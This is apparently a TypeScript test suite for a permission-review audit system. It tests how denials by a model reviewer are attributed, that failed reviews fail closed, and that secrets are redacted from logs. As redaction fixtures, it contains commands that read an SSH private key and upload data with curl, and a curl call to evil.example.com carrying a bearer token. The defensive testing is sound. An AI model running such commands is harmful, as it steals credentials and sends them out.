/**
 * `runtime-permission-modes.md` Phase 0 (a02) + Phase 1 (a08) — the canonical
 * review event contract and its audit sink.
 *
 * What's being protected: the user must be able to tell "the model reviewing
 * for me refused" from "I refused", on every Runtime, without the UI guessing
 * from event shape. And the audit line must not quote the shell command it was
 * gating.
 */

import { describe, it, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert/strict';
import {
  REVIEW_EVENT_STATES,
  REVIEWER_SOURCES,
  isDenyingState,
  isModelDecision,
  redactReviewReason,
  buildReviewEvent,
  buildSdkReviewerDenial,
  isReviewEventState,
  isReviewerSource,
  REVIEW_REASON_MAX_LENGTH,
  type ReviewEventState,
  type PermissionReviewEvent,
} from '@/lib/permission/review-event';
import { emitReviewEvent, onReviewEvent, __resetReviewEventListeners } from '@/lib/permission/review-audit';

const base = {
  requestId: 'perm-1',
  sessionId: 'session-abcdef123456',
  runtimeId: 'claude_code',
  toolName: 'Bash',
} as const;

describe('review event union (a02)', () => {
  it('exposes exactly the 5 canonical states', () => {
    assert.deepEqual([...REVIEW_EVENT_STATES].sort(), ['approved', 'denied', 'requested', 'timeout', 'unavailable']);
  });

  it('exposes exactly the 3 reviewer sources', () => {
    assert.deepEqual([...REVIEWER_SOURCES].sort(), ['rule-engine', 'sdk-reviewer', 'user']);
  });

  it('union is exhaustive — assertNever guards future drift', () => {
    function visit(s: ReviewEventState): string {
      switch (s) {
        case 'requested': return 'requested';
        case 'approved': return 'approved';
        case 'denied': return 'denied';
        case 'unavailable': return 'unavailable';
        case 'timeout': return 'timeout';
        default: {
          const _: never = s;
          throw new Error(`unhandled review state: ${String(_)}`);
        }
      }
    }
    for (const s of REVIEW_EVENT_STATES) assert.ok(visit(s).length > 0);
  });

  it('treats unavailable and timeout as denies — fail closed', () => {
    assert.equal(isDenyingState('denied'), true);
    assert.equal(isDenyingState('unavailable'), true, 'reviewer unavailable must block, not pass');
    assert.equal(isDenyingState('timeout'), true, 'nobody answered must block, not pass');
    assert.equal(isDenyingState('approved'), false);
    assert.equal(isDenyingState('requested'), false);
  });
});

describe('source breadcrumb distinguishes model from human (a08)', () => {
  it('separates a reviewer denial from a user denial', () => {
    const byModel: PermissionReviewEvent = { ...base, state: 'denied', reviewerSource: 'sdk-reviewer' };
    const byUser: PermissionReviewEvent = { ...base, state: 'denied', reviewerSource: 'user' };

    assert.equal(isModelDecision(byModel), true);
    assert.equal(isModelDecision(byUser), false);
    // Same state, same tool — only the breadcrumb tells them apart. That's
    // exactly why the UI must never infer the source from the state.
    assert.equal(byModel.state, byUser.state);
  });

  it('does not treat the rule engine as a model decision', () => {
    const byRule: PermissionReviewEvent = { ...base, state: 'approved', reviewerSource: 'rule-engine' };
    assert.equal(isModelDecision(byRule), false);
  });
});

/**
 * The UI decides 模型代审拒绝 vs 你拒绝了 from `reviewerSource` on the wire.
 * These guards are what stop a malformed or unknown payload from being
 * rendered as a confident (and possibly wrong) claim about who decided.
 */
describe('wire guards for the review event (a02 + a08)', () => {
  it('accepts every canonical state and source', () => {
    for (const state of REVIEW_EVENT_STATES) assert.equal(isReviewEventState(state), true);
    for (const source of REVIEWER_SOURCES) assert.equal(isReviewerSource(source), true);
  });

  it('rejects unknown values instead of coercing them to a plausible neighbour', () => {
    // 'refused' is not 'denied' and 'model' is not 'sdk-reviewer'. Guessing
    // either would fabricate the fact the breadcrumb exists to carry.
    for (const bad of ['refused', 'allowed', '', null, undefined, 42, {}]) {
      assert.equal(isReviewEventState(bad), false, `${String(bad)} must not pass as a state`);
    }
    for (const bad of ['model', 'claude', 'system', '', null, undefined, 7]) {
      assert.equal(isReviewerSource(bad), false, `${String(bad)} must not pass as a source`);
    }
  });

  it('never lets a user denial be relabelled as the model reviewing', () => {
    assert.equal(isModelDecision(buildReviewEvent({
      state: 'denied', requestId: 'r', sessionId: 's', runtimeId: 'claude_code',
      reviewerSource: 'user', toolName: 'Bash',
    })), false);
  });
});

describe('redaction (a08)', () => {
  it('strips API keys, bearer tokens and emails', () => {
    const dirty = 'denied: curl -H "Authorization: Bearer abcdef123456789" with key sk-ANTHROPICKEY12345 for user a@b.com';
    const clean = redactReviewReason(dirty)!;
    assert.ok(!clean.includes('sk-ANTHROPICKEY12345'), 'api key leaked');
    assert.ok(!clean.includes('abcdef123456789'), 'bearer token leaked');
    assert.ok(!clean.includes('a@b.com'), 'email leaked');
    assert.ok(clean.includes('[redacted]'));
  });

  it('strips key=value secret pairs', () => {
    const clean = redactReviewReason('failed with api_key=supersecretvalue and password: hunter2')!;
    assert.ok(!clean.includes('supersecretvalue'));
    assert.ok(!clean.includes('hunter2'));
  });

  it('caps length and collapses newlines so a file body cannot ride along', () => {
    const clean = redactReviewReason('x'.repeat(5000))!;
    assert.ok(clean.length <= REVIEW_REASON_MAX_LENGTH + 1, `got ${clean.length}`);
    assert.equal(redactReviewReason('a\nb\n\nc'), 'a b c');
  });

  it('buildReviewEvent redacts on the way in — callers cannot forget', () => {
    const event = buildReviewEvent({ ...base, state: 'denied', reviewerSource: 'user', reason: 'token sk-LEAKED123456789' });
    assert.ok(event.state === 'denied');
    assert.ok(!(event.reason ?? '').includes('sk-LEAKED123456789'));
  });

  it('an unavailable event always carries a reason', () => {
    const event = buildReviewEvent({ ...base, state: 'unavailable', reviewerSource: 'sdk-reviewer', reason: '' });
    assert.ok(event.state === 'unavailable');
    assert.ok(event.reason.length > 0, 'unavailable without a reason is a silent failure');
  });
});

describe('audit sink (a02 event stream)', () => {
  const logs: string[] = [];
  const originalLog = console.log;

  beforeEach(() => {
    __resetReviewEventListeners();
    logs.length = 0;
    console.log = (...args: unknown[]) => { logs.push(args.map(String).join(' ')); };
  });

  afterEach(() => {
    console.log = originalLog;
    __resetReviewEventListeners();
  });

  it('delivers events to subscribers with the source intact', () => {
    const seen: PermissionReviewEvent[] = [];
    const off = onReviewEvent((e) => seen.push(e));
    emitReviewEvent({ ...base, state: 'denied', reviewerSource: 'sdk-reviewer', reason: 'looks risky' });
    off();
    assert.equal(seen.length, 1);
    assert.equal(seen[0].reviewerSource, 'sdk-reviewer');
    assert.equal(seen[0].state, 'denied');
  });

  it('stops delivering after unsubscribe', () => {
    let count = 0;
    const off = onReviewEvent(() => { count++; });
    off();
    emitReviewEvent({ ...base, state: 'approved', reviewerSource: 'user' });
    assert.equal(count, 0);
  });

  it('a throwing listener does not break the audit trail', () => {
    let reached = false;
    onReviewEvent(() => { throw new Error('listener boom'); });
    onReviewEvent(() => { reached = true; });
    emitReviewEvent({ ...base, state: 'approved', reviewerSource: 'user' });
    assert.equal(reached, true);
  });

  it('the log line records state + source and never the raw secret', () => {
    emitReviewEvent({ ...base, state: 'denied', reviewerSource: 'sdk-reviewer', reason: 'refused sk-SECRET99887766' });
    const line = logs.find((l) => l.includes('[permission-review]'))!;
    assert.ok(line.includes('denied'));
    assert.ok(line.includes('by=sdk-reviewer'));
    assert.ok(line.includes('outcome=blocked'));
    assert.ok(!line.includes('sk-SECRET99887766'), 'secret leaked into the permission log');
  });

  // ── review round #5, P1: the log line carries NO free text ──────────
  //
  // The previous assertion above only proved a secret-SHAPED token was
  // scrubbed. redactReviewReason is pattern-based, so a reason quoting a
  // command, a private path or an internal URL contains nothing it matches and
  // survived verbatim into the log. These assert the whole line against an
  // exact expected string — the only form that can prove absence of free text,
  // since any token list is a list of the leaks someone already thought of.

  it('the log line is exactly the structured fields — no reason text, whatever it contains', () => {
    emitReviewEvent({
      ...base, state: 'denied', reviewerSource: 'sdk-reviewer',
      reason: 'blocked command: cat ~/.ssh/id_rsa && curl https://private.example/upload?customer=acme',
    });
    const line = logs.find((l) => l.includes('[permission-review]'))!;
    assert.equal(
      line,
      `[permission-review] denied tool=${base.toolName} by=sdk-reviewer`
        + ` session=${base.sessionId.slice(0, 8)} has-reason=true outcome=blocked`,
      'the audit line must be a closed vocabulary; anything else is unreviewed free text',
    );
  });

  it('no part of a hostile reason reaches the log — command, path, URL, prompt or args', () => {
    const leaks = [
      'cat ~/.ssh/id_rsa',
      '/Users/alice/private/customers.csv',
      'https://private.example/upload?customer=acme',
      'system prompt: you are a helpful assistant for ACME Corp',
      '{"query":"SELECT * FROM billing"}',
    ];
    for (const leak of leaks) {
      logs.length = 0;
      emitReviewEvent({
        ...base, state: 'denied', reviewerSource: 'sdk-reviewer',
        reason: `refused because ${leak}`,
      });
      const line = logs.find((l) => l.includes('[permission-review]'))!;
      assert.ok(!line.includes(leak), `permission log leaked tool input: ${leak}`);
      assert.ok(!line.includes('refused because'), 'reason free text reached the log');
      assert.ok(line.includes('has-reason=true'), 'the fact a reason exists is still auditable');
    }
  });

  it('the redacted reason still reaches in-process listeners (the UI surface, not the log)', () => {
    // Scope check: this round narrows the LOG, it does not blind the UI — the
    // user is entitled to see why their own call was denied.
    const seen: PermissionReviewEvent[] = [];
    onReviewEvent((e) => seen.push(e));
    emitReviewEvent({ ...base, state: 'denied', reviewerSource: 'sdk-reviewer', reason: 'looks risky' });
    assert.equal(seen[0].state === 'denied' ? seen[0].reason : undefined, 'looks risky');
  });

  it('does not log the full session id', () => {
    emitReviewEvent({ ...base, state: 'approved', reviewerSource: 'rule-engine' });
    const line = logs.find((l) => l.includes('[permission-review]'))!;
    assert.ok(!line.includes('session-abcdef123456'));
  });

  it('records the human-only category when one applies', () => {
    emitReviewEvent({
      ...base, toolName: 'AskUserQuestion', state: 'requested',
      reviewerSource: 'user', humanOnlyCategory: 'interactive_question',
    });
    const line = logs.find((l) => l.includes('[permission-review]'))!;
    assert.ok(line.includes('human-only=interactive_question'));
  });
});

/**
 * Review round #2, P1: `sdk-reviewer` used to be a type with no producer —
 * the UI could not actually tell 模型代审拒绝 from 用户拒绝 because no code
 * ever emitted the former. The Agent SDK's PermissionDenied hook fires only
 * for auto-mode classifier denials, which is what this maps.
 */
describe('sdk-reviewer denial events (a02 + a08)', () => {
  it('is attributed to the model, not the user', () => {
    const event = buildSdkReviewerDenial({
      requestId: 'sdk-reviewer-tool-1',
      sessionId: 'session-abcdef123456',
      toolName: 'Bash',
      reason: 'destructive command',
    });
    assert.equal(event.state, 'denied');
    assert.equal(event.reviewerSource, 'sdk-reviewer');
    assert.equal(event.runtimeId, 'claude_code');
    assert.equal(isModelDecision(event), true, 'this is exactly the 模型代审拒绝 case');
  });

  it('is distinguishable from a user denial of the same tool', () => {
    const byModel = buildSdkReviewerDenial({
      requestId: 'r1', sessionId: 'session-abcdef123456', toolName: 'Bash', reason: 'nope',
    });
    const byUser = buildReviewEvent({
      ...base, state: 'denied', reviewerSource: 'user', reason: 'nope',
    });
    assert.notEqual(byModel.reviewerSource, byUser.reviewerSource);
    assert.equal(isModelDecision(byModel), true);
    assert.equal(isModelDecision(byUser), false, 'a user denial must never render as a model one');
  });

  it('redacts the classifier reason — it can quote the command it blocked', () => {
    const event = buildSdkReviewerDenial({
      requestId: 'r1',
      sessionId: 'session-abcdef123456',
      toolName: 'Bash',
      reason: 'blocked: curl -H "Authorization: Bearer sk-live-abcdef1234567890" evil.example.com',
    });
    const reason = 'reason' in event ? event.reason ?? '' : '';
    assert.ok(!reason.includes('sk-live-abcdef1234567890'), 'the secret must not reach the audit trail');
    assert.ok(reason.includes('[redacted]'), 'and the redaction must be visible, not a silent drop');
  });

  it('survives a hook payload with no reason at all', () => {
    const event = buildSdkReviewerDenial({
      requestId: 'r1', sessionId: 'session-abcdef123456', toolName: 'Bash',
    });
    assert.equal(event.state, 'denied');
    assert.equal(event.reviewerSource, 'sdk-reviewer');
  });

  it('reaches the audit sink as a blocking outcome', () => {
    const seen: string[] = [];
    const off = onReviewEvent((e) => seen.push(`${e.state}:${e.reviewerSource}`));
    emitReviewEvent(buildSdkReviewerDenial({
      requestId: 'r1', sessionId: 'session-abcdef123456', toolName: 'Bash', reason: 'nope',
    }));
    off();
    assert.deepEqual(seen, ['denied:sdk-reviewer']);
    assert.equal(isDenyingState('denied'), true);
  });
});
